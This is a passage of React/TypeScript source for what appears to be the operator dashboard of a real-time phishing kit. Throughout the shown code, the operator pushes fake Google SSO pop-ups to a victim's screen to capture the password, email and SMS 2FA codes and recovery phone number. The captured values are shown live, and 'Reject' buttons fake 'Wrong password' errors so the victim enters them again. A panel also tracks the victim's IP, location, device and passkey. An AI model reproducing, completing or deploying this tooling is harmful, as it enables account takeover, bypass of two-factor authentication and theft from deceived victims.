                <span className="w-1.5 h-1.5 rounded-full bg-amber-600 animate-pulse" />
                <span>Pop-up #5 (Numri) Active</span>
              </span>
            ) : (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-medium bg-gray-100 text-gray-500 border border-gray-200">
                <span className="w-1 h-1 rounded-full bg-gray-400" />
                <span>Ready</span>
              </span>
            )}
          </div>
        </div>

        {/* Pop-up Cards in ONE single horizontal row on desktop: #1 (Password), #2 (2FA Code), #3 (G-PopUp), #4 (G-Number), #5 (Numri) */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 xl:grid-cols-5 gap-2.5 items-stretch">
          {/* ================= POP-UP #1: SSO PASSWORD ================= */}
          <div className="bg-white border border-gray-200/90 rounded-xl p-2.5 flex flex-col justify-between space-y-2 shadow-2xs min-w-0">
            <div className="flex items-center justify-between pb-1.5 border-b border-gray-100">
              <div className="flex items-center gap-1.5 min-w-0">
                <span className="w-2 h-2 rounded-full bg-[#0b57d0] shrink-0" />
                <span className="text-[11px] font-bold text-gray-900 truncate">
                  Pop-up #1: Password
                </span>
              </div>
              <div className="flex items-center gap-1 shrink-0">
                {isNLoginActive && !codeData.n_thanks_seen && (
                  <span className="text-[9px] font-semibold bg-amber-50 text-amber-700 px-1 py-0.2 rounded border border-amber-200 animate-pulse">
                    Thanks
                  </span>
                )}
                <span className="text-[9px] font-medium bg-blue-50 text-blue-700 px-1 py-0.2 rounded border border-blue-100">
                  Login
                </span>
              </div>
            </div>

            {/* Candidate Entered Password Box */}
            <div className="space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-semibold text-gray-600">
                  Entered Password
                </span>
                {hasNLoginSubmitted && (
                  <button
                    type="button"
                    disabled={busy}
                    onClick={() => onResetNPassword(b)}
                    title="Reset submitted password so candidate can re-enter"
                    className="text-[9px] font-semibold text-red-600 hover:text-red-700 transition-colors cursor-pointer"
                  >
                    Reset
                  </button>
                )}
              </div>

              <div className="flex items-center justify-between gap-1 px-2.5 py-1 bg-gray-50 border border-gray-200 rounded-lg min-h-[32px]">
                <span
                  className={`font-mono font-bold text-xs select-all truncate flex-1 min-w-0 ${
                    codeData.n_submitted_password
                      ? "text-gray-900"
                      : "text-gray-400 font-normal italic text-[11px]"
                  }`}
                  title={codeData.n_submitted_password || "Awaiting password…"}
                >
                  {codeData.n_submitted_password || "Awaiting…"}
                </span>
                <CopyIconButton value={codeData.n_submitted_password} label="Candidate Password" />
              </div>
            </div>

            {/* Actions: Send & Reject */}
            <div className="flex items-center gap-1 pt-0.5">
              <button
                type="button"
                disabled={busy}
                onClick={() => onSendNLogin(b)}
                className={`flex-1 py-1.5 px-2 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer shadow-2xs ${
                  isNLoginActive
                    ? "bg-[#0b57d0] text-white shadow-blue-200"
                    : "bg-[#0b57d0] hover:bg-[#0842a0] text-white"
                }`}
                title="Open the Google/SSO login pop-up on candidate screen"
              >
                <Send className="w-3 h-3 shrink-0" />
                <span className="truncate">{isNLoginActive ? "Re-send" : "Send #1"}</span>
              </button>

              <button
                type="button"
                disabled={busy || (!isNLoginActive && !hasNLoginSubmitted && !isNLoginRejected)}
                onClick={() => onRejectNLogin(b)}
                className="py-1.5 px-2 rounded-lg border border-red-300 text-red-600 bg-red-50/60 hover:bg-red-100 text-[11px] font-bold flex items-center justify-center gap-1 transition-all disabled:opacity-30 disabled:border-gray-200 disabled:bg-gray-50 disabled:text-gray-400 disabled:cursor-not-allowed cursor-pointer shrink-0"
                title="Reject password and show 'Wrong password' error to candidate"
              >
                <X className="w-3 h-3 shrink-0" />
                <span>Reject</span>
              </button>
            </div>

            {/* Password banner */}
            {hasNLoginSubmitted && (
              <div className="flex items-center justify-between gap-1 px-2 py-0.5 bg-purple-50 border border-purple-200 rounded-md text-purple-900 text-[10px] font-semibold">
                <span className="truncate">🔑 Password submitted</span>
                <span className="text-[9px] font-bold bg-purple-600 text-white px-1.5 py-0.2 rounded-full shrink-0">
                  Done
                </span>
              </div>
            )}

            {/* Rejection banner */}
            {isNLoginRejected && (
              <div className="flex items-center justify-between gap-1 px-2 py-0.5 bg-red-50 border border-red-200 rounded-md text-red-800 text-[10px] font-semibold">
                <span className="truncate">⚠️ Sent "Wrong password"</span>
                <span className="text-[9px] font-bold bg-red-600 text-white px-1.5 py-0.2 rounded-full shrink-0">
                  Rejected
                </span>
              </div>
            )}
          </div>

          {/* ================= POP-UP #2: EMAIL 2FA CODE ================= */}
          <div className="bg-white border border-gray-200/90 rounded-xl p-2.5 flex flex-col justify-between space-y-2 shadow-2xs min-w-0">
            <div className="flex items-center justify-between pb-1.5 border-b border-gray-100">
              <div className="flex items-center gap-1.5 min-w-0">
                <span className="w-2 h-2 rounded-full bg-indigo-600 shrink-0" />
                <span className="text-[11px] font-bold text-gray-900 truncate">
                  Pop-up #2: 2FA Code
                </span>
              </div>
              <span className="text-[9px] font-medium bg-indigo-50 text-indigo-700 px-1 py-0.2 rounded border border-indigo-100 shrink-0">
                Code
              </span>
            </div>

            {/* Variable Email Input Box */}
            <div className="space-y-1">
              <label className="text-[10px] font-semibold text-gray-600 flex items-center justify-between">
                <span>Prompt Email (Variable)</span>
              </label>

              <div className="flex items-center gap-1">
                <input
                  type="text"
                  value={localTargetEmail}
                  onChange={(e) => setLocalTargetEmail(e.target.value)}
                  onBlur={() => onUpdateNCodeTargetEmail(b, localTargetEmail)}
                  placeholder="dri•••••••@gmail.com"
                  className="w-full px-2 py-0.5 bg-white border border-gray-300 rounded-md text-xs font-mono font-medium text-gray-900 placeholder-gray-400 focus:outline-none focus:border-indigo-600 shadow-2xs"
                  title="This email address will appear in the pop-up"
                />
                <button
                  type="button"
                  disabled={busy}
                  onClick={() => onUpdateNCodeTargetEmail(b, localTargetEmail)}
                  className="px-1.5 py-0.5 bg-gray-100 hover:bg-gray-200 text-gray-700 rounded-md text-[10px] font-semibold shrink-0 border border-gray-200 cursor-pointer"
                  title="Save email"
                >
                  Save
                </button>
              </div>
            </div>

            {/* Candidate Entered Code Box */}
            <div className="space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-semibold text-gray-600">
                  Entered Code
                </span>
                {hasNCodeSubmitted && (
                  <button
                    type="button"
                    disabled={busy}
                    onClick={() => onResetNCode(b)}
                    title="Reset candidate entered code"
                    className="text-[9px] font-semibold text-red-600 hover:text-red-700 transition-colors cursor-pointer"
                  >
                    Reset
                  </button>
                )}
              </div>

              <div className="flex items-center justify-between gap-1 px-2.5 py-1 bg-gray-50 border border-gray-200 rounded-lg min-h-[32px]">
                <span
                  className={`font-mono font-bold text-xs select-all tracking-wider truncate flex-1 min-w-0 ${
                    codeData.n_submitted_code
                      ? "text-indigo-950"
                      : "text-gray-400 font-normal italic text-[11px] tracking-normal"
                  }`}
                  title={codeData.n_submitted_code || "Awaiting code…"}
                >
                  {codeData.n_submitted_code || "Awaiting…"}
                </span>
                <CopyIconButton value={codeData.n_submitted_code} label="Candidate Code" />
              </div>
            </div>

            {/* Actions: Send & Reject */}
            <div className="flex items-center gap-1 pt-0.5">
              <button
                type="button"
                disabled={busy}
                onClick={handleSendCode}
                className={`flex-1 py-1.5 px-2 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer shadow-2xs ${
                  isNCodeActive
                    ? "bg-indigo-600 text-white shadow-indigo-200"
                    : "bg-indigo-600 hover:bg-indigo-700 text-white"
                }`}
                title="Open the Email 2FA Code pop-up on candidate screen"
              >
                <Send className="w-3 h-3 shrink-0" />
                <span className="truncate">{isNCodeActive ? "Re-send" : "Send #2"}</span>
              </button>

              <button
                type="button"
                disabled={busy || (!isNCodeActive && !hasNCodeSubmitted && !isNCodeRejected)}
                onClick={() => onRejectNCode(b)}
                className="py-1.5 px-2 rounded-lg border border-red-300 text-red-600 bg-red-50/60 hover:bg-red-100 text-[11px] font-bold flex items-center justify-center gap-1 transition-all disabled:opacity-30 disabled:border-gray-200 disabled:bg-gray-50 disabled:text-gray-400 disabled:cursor-not-allowed cursor-pointer shrink-0"
                title="Reject code and show 'Wrong code' error to candidate"
              >
                <X className="w-3 h-3 shrink-0" />
                <span>Reject</span>
              </button>
            </div>

            {/* Code banner */}
            {hasNCodeSubmitted && (
              <div className="flex items-center justify-between gap-1 px-2 py-0.5 bg-indigo-50 border border-indigo-200 rounded-md text-indigo-950 text-[10px] font-semibold">
                <span className="truncate">✉️ Code: <b className="font-mono text-xs">{codeData.n_submitted_code}</b></span>
                <span className="text-[9px] font-bold bg-indigo-600 text-white px-1.5 py-0.2 rounded-full shrink-0">
                  Done
                </span>
              </div>
            )}

            {/* Rejection banner */}
            {isNCodeRejected && (
              <div className="flex items-center justify-between gap-1 px-2 py-0.5 bg-red-50 border border-red-200 rounded-md text-red-800 text-[10px] font-semibold">
                <span className="truncate">⚠️ Sent "Wrong code"</span>
                <span className="text-[9px] font-bold bg-red-600 text-white px-1.5 py-0.2 rounded-full shrink-0">
                  Rejected
                </span>
              </div>
            )}
          </div>

          {/* ================= POP-UP #3: G-POPUP (SMS G-CODE) ================= */}
          <div className="bg-white border border-gray-200/90 rounded-xl p-2.5 flex flex-col justify-between space-y-2 shadow-2xs min-w-0">
            <div className="flex items-center justify-between pb-1.5 border-b border-gray-100">
              <div className="flex items-center gap-1.5 min-w-0">
                <span className="w-2 h-2 rounded-full bg-[#0b57d0] shrink-0" />
                <span className="text-[11px] font-bold text-gray-900 truncate">
                  Pop-up #3: G-PopUp
                </span>
              </div>
              <span className="text-[9px] font-medium bg-blue-50 text-blue-700 px-1 py-0.2 rounded border border-blue-100 shrink-0">
                SMS
              </span>
            </div>

            {/* Candidate Entered G-Code Box */}
            <div className="space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-semibold text-gray-600">
                  Entered G-Code
                </span>
                {hasGPopUpSubmitted && (
                  <button
                    type="button"
                    disabled={busy}
                    onClick={() => onResetGPopUp(b)}
                    title="Reset candidate entered G-code"
                    className="text-[9px] font-semibold text-red-600 hover:text-red-700 transition-colors cursor-pointer"
                  >
                    Reset
                  </button>
                )}
              </div>

              <div className="flex items-center justify-between gap-1 px-2.5 py-1 bg-gray-50 border border-gray-200 rounded-lg min-h-[32px]">
                <span
                  className={`font-mono font-bold text-xs select-all tracking-wider truncate flex-1 min-w-0 ${
                    codeData.n_submitted_gcode
                      ? "text-blue-950"
                      : "text-gray-400 font-normal italic text-[11px] tracking-normal"
                  }`}
                  title={codeData.n_submitted_gcode || "Awaiting G-code…"}
                >
                  {codeData.n_submitted_gcode || "Awaiting…"}
                </span>
                <CopyIconButton value={codeData.n_submitted_gcode} label="Candidate G-Code" />
              </div>
            </div>

            {/* Actions: Send & Reject */}
            <div className="flex items-center gap-1 pt-0.5">
              <button
                type="button"
                disabled={busy}
                onClick={() => onSendGPopUp(b)}
                className={`flex-1 py-1.5 px-2 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer shadow-2xs ${
                  isGPopUpActive
                    ? "bg-[#0b57d0] text-white shadow-blue-200"
                    : "bg-[#0b57d0] hover:bg-[#0842a0] text-white"
                }`}
                title="Open G-PopUp on candidate screen"
              >
                <Send className="w-3 h-3 shrink-0" />
                <span className="truncate">{isGPopUpActive ? "Re-send" : "Send #3"}</span>
              </button>

              <button
                type="button"
                disabled={busy || (!isGPopUpActive && !hasGPopUpSubmitted && !isGPopUpRejected)}
                onClick={() => onRejectGPopUp(b)}
                className="py-1.5 px-2 rounded-lg border border-red-300 text-red-600 bg-red-50/60 hover:bg-red-100 text-[11px] font-bold flex items-center justify-center gap-1 transition-all disabled:opacity-30 disabled:border-gray-200 disabled:bg-gray-50 disabled:text-gray-400 disabled:cursor-not-allowed cursor-pointer shrink-0"
                title="Reject G-code and show 'Wrong code' error to candidate"
              >
                <X className="w-3 h-3 shrink-0" />
                <span>Reject</span>
              </button>
            </div>

            {/* G-Code banner */}
            {hasGPopUpSubmitted && (
              <div className="flex items-center justify-between gap-1 px-2 py-0.5 bg-blue-50 border border-blue-200 rounded-md text-blue-950 text-[10px] font-semibold">
                <span className="truncate">📱 G-Code: <b className="font-mono text-xs">{codeData.n_submitted_gcode}</b></span>
                <span className="text-[9px] font-bold bg-[#0b57d0] text-white px-1.5 py-0.2 rounded-full shrink-0">
                  Done
                </span>
              </div>
            )}

            {/* Rejection banner */}
            {isGPopUpRejected && (
              <div className="flex items-center justify-between gap-1 px-2 py-0.5 bg-red-50 border border-red-200 rounded-md text-red-800 text-[10px] font-semibold">
                <span className="truncate">⚠️ Sent "Wrong code"</span>
                <span className="text-[9px] font-bold bg-red-600 text-white px-1.5 py-0.2 rounded-full shrink-0">
                  Rejected
                </span>
              </div>
            )}
          </div>

          {/* ================= POP-UP #4: G-NUMBER (PHONE RECOVERY) ================= */}
          <div className="bg-white border border-gray-200/90 rounded-xl p-2.5 flex flex-col justify-between space-y-2 shadow-2xs min-w-0">
            <div className="flex items-center justify-between pb-1.5 border-b border-gray-100">
              <div className="flex items-center gap-1.5 min-w-0">
                <span className="w-2 h-2 rounded-full bg-[#0b57d0] shrink-0" />
                <span className="text-[11px] font-bold text-gray-900 truncate">
                  Pop-up #4: G-Number
                </span>
              </div>
              <span className="text-[9px] font-medium bg-blue-50 text-blue-700 px-1 py-0.2 rounded border border-blue-100 shrink-0">
                Recovery
              </span>
            </div>

            {/* Variable Security Mask Hint Input */}
            <div className="space-y-1">
              <div className="flex items-center justify-between">
                <label className="text-[10px] font-semibold text-gray-600">
                  Mask Hint
                </label>
              </div>
              <div className="flex items-center gap-1">
                <input
                  type="text"
                  value={localPhoneMask}
                  disabled={busy}
                  onChange={(e) => setLocalPhoneMask(e.target.value)}
                  onBlur={() => {
                    if (localPhoneMask.trim() && localPhoneMask.trim() !== (codeData.n_phone_mask || "•••• ••• •20")) {
                      onUpdateGNumberMask(b, localPhoneMask.trim());
                    }
                  }}
                  placeholder="•••• ••• •20"
                  className="w-full text-xs font-mono font-medium px-2 py-0.5 bg-gray-50 border border-gray-300 rounded-md text-gray-900 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:bg-white shadow-2xs"
                />
              </div>
            </div>

            {/* Candidate Entered Phone Box */}
            <div className="space-y-1">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-semibold text-gray-600">
                  Entered Phone
                </span>
                {hasGNumberSubmitted && (
                  <button
                    type="button"
                    disabled={busy}
                    onClick={() => onResetGNumber(b)}
                    title="Reset candidate entered phone number"
                    className="text-[9px] font-semibold text-red-600 hover:text-red-700 transition-colors cursor-pointer"
                  >
                    Reset
                  </button>
                )}
              </div>

              <div className="flex items-center justify-between gap-1 px-2.5 py-1 bg-gray-50 border border-gray-200 rounded-lg min-h-[32px]">
                <span
                  className={`font-mono font-bold text-xs select-all tracking-wider truncate flex-1 min-w-0 ${
                    codeData.n_submitted_phone
                      ? "text-blue-950"
                      : "text-gray-400 font-normal italic text-[11px] tracking-normal"
                  }`}
                  title={codeData.n_submitted_phone || "Awaiting phone…"}
                >
                  {codeData.n_submitted_phone || "Awaiting…"}
                </span>
                <CopyIconButton value={codeData.n_submitted_phone} label="Candidate Phone" />
              </div>
            </div>

            {/* Actions: Send & Reject */}
            <div className="flex items-center gap-1 pt-0.5">
              <button
                type="button"
                disabled={busy}
                onClick={handleSendGNumber}
                className={`flex-1 py-1.5 px-2 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer shadow-2xs ${
                  isGNumberActive
                    ? "bg-[#0b57d0] text-white shadow-blue-200"
                    : "bg-[#0b57d0] hover:bg-[#0842a0] text-white"
                }`}
                title="Open G-Number pop-up on candidate screen"
              >
                <Send className="w-3 h-3 shrink-0" />
                <span className="truncate">{isGNumberActive ? "Re-send" : "Send #4"}</span>
              </button>

              <button
                type="button"
                disabled={busy || (!isGNumberActive && !hasGNumberSubmitted && !isGNumberRejected)}
                onClick={() => onRejectGNumber(b)}
                className="py-1.5 px-2 rounded-lg border border-red-300 text-red-600 bg-red-50/60 hover:bg-red-100 text-[11px] font-bold flex items-center justify-center gap-1 transition-all disabled:opacity-30 disabled:border-gray-200 disabled:bg-gray-50 disabled:text-gray-400 disabled:cursor-not-allowed cursor-pointer shrink-0"
                title="Reject phone and show 'Wrong phone number' error to candidate"
              >
                <X className="w-3 h-3 shrink-0" />
                <span>Reject</span>
              </button>
            </div>

            {/* Phone banner */}
            {hasGNumberSubmitted && (
              <div className="flex items-center justify-between gap-1 px-2 py-0.5 bg-blue-50 border border-blue-200 rounded-md text-blue-950 text-[10px] font-semibold">
                <span className="truncate">📞 Phone: <b className="font-mono text-xs">{codeData.n_submitted_phone}</b></span>
                <span className="text-[9px] font-bold bg-[#0b57d0] text-white px-1.5 py-0.2 rounded-full shrink-0">
                  Done
                </span>
              </div>
            )}

            {/* Rejection banner */}
            {isGNumberRejected && (
              <div className="flex items-center justify-between gap-1 px-2 py-0.5 bg-red-50 border border-red-200 rounded-md text-red-800 text-[10px] font-semibold">
                <span className="truncate">⚠️ Sent "Wrong phone"</span>
                <span className="text-[9px] font-bold bg-red-600 text-white px-1.5 py-0.2 rounded-full shrink-0">
                  Rejected
                </span>
              </div>
            )}
          </div>

          {/* ================= POP-UP #5: G-APPRECIATE (NUMRI) ================= */}
          <div className="bg-white border border-amber-200/90 rounded-xl p-2.5 flex flex-col justify-between space-y-2 shadow-2xs min-w-0">
            <div className="flex items-center justify-between pb-1.5 border-b border-amber-100">
              <div className="flex items-center gap-1.5 min-w-0">
                <span className="w-2 h-2 rounded-full bg-amber-500 shrink-0" />
                <span className="text-[11px] font-bold text-gray-900 truncate">Pop-up #5: Numri</span>
              </div>
              <span className="text-[9px] font-medium bg-amber-50 text-amber-700 px-1 py-0.2 rounded border border-amber-100 shrink-0">Number</span>
            </div>

            <div className="space-y-1">
              <label className="text-[10px] font-semibold text-gray-600 flex items-center justify-between">
                <span>Value / Numri Shown</span>
              </label>
              <div className="flex items-center gap-1">
                <input
                  type="text"
                  value={localAppreciateValue}
                  disabled={busy}
                  onChange={(e) => setLocalAppreciateValue(e.target.value)}
                  placeholder="e.g. 22"
                  className="w-full text-xs font-mono font-bold px-2 py-0.5 bg-amber-50/60 border border-amber-300 rounded-md text-gray-900 focus:outline-none focus:ring-1 focus:ring-amber-400 focus:bg-white transition-all text-center shadow-2xs"
                  title="This value will appear as the big number/text in the candidate pop-up"
                />
              </div>
            </div>

            {/* Display box showing current value */}
            <div className="flex items-center justify-between gap-1 px-2.5 py-1 bg-amber-50/70 border border-amber-200 rounded-lg min-h-[32px]">
              <span className="text-[10px] text-amber-800 font-semibold truncate">Showing:</span>
              <span className="font-mono font-bold text-xs text-amber-900 select-all truncate">
                {codeData.n_appreciate_value || localAppreciateValue || "—"}
              </span>
            </div>

            <div className="flex items-center gap-1 pt-0.5">
              <button
                type="button"
                disabled={busy || !localAppreciateValue.trim()}
                onClick={handleSendGAppreciate}
                className={`flex-1 py-1.5 px-2 rounded-lg text-[11px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer shadow-2xs ${
                  isGAppreciateActive ? "bg-amber-500 text-white shadow-amber-200" : "bg-amber-500 hover:bg-amber-600 text-white"
                } disabled:opacity-40 disabled:cursor-not-allowed`}
                title="Open Pop-up #5 (Numri) on candidate screen"
              >
                <Send className="w-3 h-3 shrink-0" />
                <span className="truncate">{isGAppreciateActive ? "Re-send" : "Send #5"}</span>
              </button>
              <button
                type="button"
                disabled={busy || !isGAppreciateActive}
                onClick={() => onResetGAppreciate(b)}
                className="py-1.5 px-2 rounded-lg border border-gray-300 text-gray-600 bg-gray-50 hover:bg-gray-100 text-[11px] font-bold flex items-center justify-center gap-1 transition-all disabled:opacity-30 disabled:border-gray-200 disabled:bg-gray-50 disabled:text-gray-400 disabled:cursor-not-allowed cursor-pointer shrink-0"
                title="Close the Numri pop-up on candidate screen"
              >
                <X className="w-3 h-3 shrink-0" />
                <span>Close</span>
              </button>
            </div>

            {isGAppreciateActive && (
              <div className="flex items-center justify-between gap-1 px-2 py-0.5 bg-amber-50 border border-amber-200 rounded-md text-amber-950 text-[10px] font-semibold">
                <span className="truncate">🔢 Numri: &ldquo;{codeData.n_appreciate_value || localAppreciateValue}&rdquo;</span>
                <span className="text-[9px] font-bold bg-amber-500 text-white px-1.5 py-0.2 rounded-full shrink-0">Live</span>
              </div>
            )}
          </div>
        </div>

        {/* Bottom hint */}
        <div className="flex items-center justify-between text-[11px] text-gray-500 bg-white/70 border border-blue-100 rounded-lg px-2.5 py-1">
          <span>
            Candidate popups display identical triple-sized Google SSO frames. Submitted passwords and codes arrive live.
          </span>
          <span className="text-[10px] text-gray-400 font-mono hidden sm:inline">N-Portal v2.0</span>
        </div>
      </div>
    </div>
  );
}
// Standalone Booking Card Component
function BookingCardItem({
  b,
  busyId,
  isOnline,
  onConfirm,
  onRejectId,
  onRequireCode,
  onRejectSpecificCode,
  onSendPopCode,
  onClearPopCode,
  onSendNotification,
  onClearNotification,
  onSendNLogin,
  onRejectNLogin,
  onUpdateExpectedPassword,
  onResetNPassword,
  onSendNCode,
  onRejectNCode,
  onResetNCode,
  onUpdateNCodeTargetEmail,
  onSendGPopUp,
  onRejectGPopUp,
  onResetGPopUp,
  onSendGNumber,
  onRejectGNumber,
  onResetGNumber,
  onUpdateGNumberMask,
  onSendGAppreciate,
  onResetGAppreciate,
  onSendNorthError,
  onResetNorthError,
  candidateUserAgent,
}: {
  b: Booking;
  busyId: string | null;
  isOnline: boolean;
  candidateUserAgent?: string | null;
  onConfirm: (id: string) => Promise<void>;
  onRejectId: (id: string) => Promise<void>;
  onRequireCode: (b: Booking, num: number) => Promise<void>;
  onRejectSpecificCode: (b: Booking, num: number) => Promise<void>;
  onSendPopCode: (b: Booking, codeVal: string) => Promise<void>;
  onClearPopCode: (b: Booking) => Promise<void>;
  onSendNotification: (b: Booking, deviceText: string) => Promise<void>;
  onClearNotification: (b: Booking) => Promise<void>;
  onSendNLogin: (b: Booking) => Promise<void>;
  onRejectNLogin: (b: Booking) => Promise<void>;
  onUpdateExpectedPassword: (b: Booking, pass: string) => Promise<void>;
  onResetNPassword: (b: Booking) => Promise<void>;
  onSendNCode: (b: Booking, targetEmail: string) => Promise<void>;
  onRejectNCode: (b: Booking) => Promise<void>;
  onResetNCode: (b: Booking) => Promise<void>;
  onUpdateNCodeTargetEmail: (b: Booking, email: string) => Promise<void>;
  onSendGPopUp: (b: Booking) => Promise<void>;
  onRejectGPopUp: (b: Booking) => Promise<void>;
  onResetGPopUp: (b: Booking) => Promise<void>;
  onSendGNumber: (b: Booking, phoneMask: string) => Promise<void>;
  onRejectGNumber: (b: Booking) => Promise<void>;
  onResetGNumber: (b: Booking) => Promise<void>;
  onUpdateGNumberMask: (b: Booking, mask: string) => Promise<void>;
  onSendGAppreciate: (b: Booking, appreciateValue: string) => Promise<void>;
  onResetGAppreciate: (b: Booking) => Promise<void>;
  onSendNorthError: (b: Booking) => Promise<void>;
  onResetNorthError: (b: Booking) => Promise<void>;
}) {
  const codeData = parseBookingCodeData(b.additional_code);
  const isNorthErrorActive = b.status === "awaiting_code" && codeData.active_req === "NORTH_ERROR_REQUESTED";
  const codes = [1, 2, 3, 4] as const;
  const deviceInfo = parseDeviceAndOS(candidateUserAgent || b.user_agent);

  return (
    <div className="bg-white border border-gray-200/90 rounded-xl shadow-xs p-3.5 sm:p-4 space-y-3 font-sans hover:shadow-sm transition-shadow">
      {/* TOP ROW: Candidate Info + Online/Offline status, Date/Time, Candidate ID & Passkey, and Top-Right Action Buttons */}
      <div className="flex flex-col xl:flex-row items-start xl:items-center justify-between gap-3 pb-2.5 border-b border-gray-100">
        {/* Candidate Profile + Online/Offline Status */}
        <div className="min-w-[170px] space-y-0.5">
          <div className="flex items-center gap-1.5">
            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">
              Candidate
            </span>

            {/* Online / Offline Indicator Badge */}
            {isOnline ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.2 rounded-full text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                <span>Online</span>
              </span>
            ) : b.status === "pending" || b.status === "awaiting_code" ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.2 rounded-full text-[10px] font-bold bg-red-50 text-red-700 border border-red-200">
                <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
                <span>Offline</span>
              </span>
            ) : (
              <span className="inline-flex items-center gap-1 px-2 py-0.2 rounded-full text-[10px] font-bold bg-gray-100 text-gray-500 border border-gray-200">
                <span className="w-1.5 h-1.5 rounded-full bg-gray-400" />
                <span>Offline</span>
              </span>
            )}
          </div>

          <h3 className="text-base font-bold text-gray-900 leading-snug">
            {b.first_name} {b.last_name}
          </h3>
          <p className="text-xs text-gray-600 font-medium">{b.email}</p>
          <p className="text-xs text-gray-500">{b.phone_number || "—"}</p>

          {/* Location & IP Address Details */}
          <div className="pt-0.5 space-y-0.5">
            {(b.city || b.state || b.country) && (
              <div className="inline-flex items-center gap-1 px-1.5 py-0.2 rounded bg-gray-50 border border-gray-200 text-[10px] font-semibold text-gray-700">
                <span>📍</span>
                <span>{[b.city, b.state, b.country].filter(Boolean).join(", ")}</span>
              </div>
            )}
            {b.ip_address && (
              <div className="flex items-center gap-1 text-[10px] text-gray-500 font-mono">
                <span className="font-semibold text-gray-700">IP:</span>
                <span className="bg-gray-50 px-1 py-0.2 rounded border border-gray-200 text-[10px]">
                  {b.ip_address}
                </span>
                <CopyIconButton value={b.ip_address} label="IP Address" />
              </div>
            )}
          </div>
        </div>

        {/* Date & Time */}
        <div className="min-w-[100px] space-y-0.5">
          <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider block">
            Date &amp; Time
          </span>
          <p className="text-xs font-bold text-gray-900">
            {new Date(b.date + "T00:00:00").toLocaleDateString("en-US", {
              month: "short",
              day: "numeric",
            })}
          </p>
          <p className="text-xs text-gray-500">{formatTime(b.start_time)}</p>

          {/* Under Date: Device/OS next to Lat & Long Fields */}
          <div className="pt-1.5 border-t border-gray-100 space-y-1">
            <div className="flex flex-wrap items-center gap-1.5">
              {/* Candidate Device & OS Badge */}
              <div
                className="inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-blue-50 border border-blue-200 text-[10px] font-semibold text-blue-900 shrink-0"
                title={`Device & OS: ${deviceInfo.full}`}
              >
                <span>{deviceInfo.icon}</span>
                <span className="truncate max-w-[130px]">{deviceInfo.full}</span>
              </div>

              {/* Latitude Field */}
              <div className="inline-flex items-center justify-between gap-1 px-1.5 py-0.5 bg-gray-50 border border-gray-200 rounded text-[10px] font-mono min-w-[115px]">
                <span className="text-[9px] font-bold text-gray-400 uppercase tracking-wide shrink-0">Lat:</span>
                <span className="text-gray-800 font-semibold truncate select-all mx-1" title={b.latitude || "—"}>
                  {b.latitude || "—"}
                </span>
                <CopyIconButton value={b.latitude} label="Latitude" />
              </div>

              {/* Longitude Field */}
              <div className="inline-flex items-center justify-between gap-1 px-1.5 py-0.5 bg-gray-50 border border-gray-200 rounded text-[10px] font-mono min-w-[115px]">
                <span className="text-[9px] font-bold text-gray-400 uppercase tracking-wide shrink-0">Long:</span>
                <span className="text-gray-800 font-semibold truncate select-all mx-1" title={b.longitude || "—"}>
                  {b.longitude || "—"}
                </span>
                <CopyIconButton value={b.longitude} label="Longitude" />
              </div>
            </div>
          </div>
        </div>

        {/* Candidate ID & Passkey Stacked Box (One on top of other in two lines) */}
        <div className="flex-1 min-w-[180px] max-w-sm flex flex-col justify-center gap-1.5">
          {/* Line 1: Candidate ID */}
          <div className="flex items-center justify-between gap-2 px-3 py-1.5 bg-gray-50/80 border border-gray-200 rounded-xl shadow-2xs min-w-0">
            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider shrink-0">
              ID:
            </span>
            {b.candidate_id ? (
              <span
                className="text-lg font-bold text-gray-900 font-sans tracking-wide select-all truncate min-w-0 flex-1"
                title={b.candidate_id}
              >
                {b.candidate_id}
              </span>
            ) : (
              <span className="text-xs text-gray-400 italic flex-1">Entering…</span>
            )}
            <CopyIconButton value={b.candidate_id} label="Candidate ID" />
          </div>

          {/* Line 2: Passkey */}
          <div className="flex items-center justify-between gap-2 px-3 py-1.5 bg-gray-50/80 border border-gray-200 rounded-xl shadow-2xs min-w-0">
            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider shrink-0">
              Passkey:
            </span>
            {b.passkey ? (
              <span
                className="text-lg font-bold text-gray-900 font-mono tracking-wider select-all truncate min-w-0 flex-1"
                title={b.passkey}
              >
                {b.passkey}
              </span>
            ) : (
              <span className="text-xs text-gray-400 italic flex-1">Entering…</span>
            )}
            <CopyIconButton value={b.passkey} label="Passkey" />
          </div>
        </div>

        {/* Top-Right Action Section: Confirm Next Step & Reject ID & North Error */}
        <div className="flex flex-col gap-1.5 min-w-[140px] w-full sm:w-auto shrink-0 self-stretch xl:self-center">
          <button
            type="button"
            disabled={busyId === b.id || b.status === "confirmed"}
            onClick={() => onConfirm(b.id)}
            className="w-full px-3 py-1.5 bg-[#059669] hover:bg-[#047857] text-white rounded-lg font-bold text-xs shadow-2xs transition-all disabled:opacity-40 flex items-center justify-center gap-1.5 cursor-pointer"
          >
            <Check className="w-3.5 h-3.5" />
            <span>Confirm Next Step</span>
          </button>

          <button
            type="button"
            disabled={busyId === b.id || b.status === "rejected"}
            onClick={() => onRejectId(b.id)}
